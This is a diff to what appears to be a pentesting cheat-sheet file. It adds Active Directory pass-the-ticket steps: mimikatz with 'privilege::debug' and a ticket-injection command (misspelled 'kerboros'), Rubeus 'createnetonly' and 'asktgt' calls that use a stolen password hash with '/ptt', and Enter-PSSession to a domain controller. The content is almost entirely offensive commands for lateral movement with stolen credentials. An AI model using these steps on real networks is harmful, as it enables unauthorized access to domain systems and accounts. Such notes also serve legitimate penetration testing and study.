@@ -61,5 +61,14 @@ mimikatz.exe
 privilege::debug
 kerboros::ptt "<abspath_to_ticket>"
 exit
-PS: Enter-PSSession -ComputerName 
+PS: Enter-PSSession -ComputerName <name: Ex_DC01>
+```
+-Using Rubeus with PS Remoting to perform PTT attack:
+```
+Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
+#In new spawned cmd 
+Rubeus.exe asktgt /user: <username> /domain: <domain> /<rc4/aes128/aes256>: <hash> /ptt
+exit
+powershell
+Enter-PSSession -ComputerName <Name>
 ```
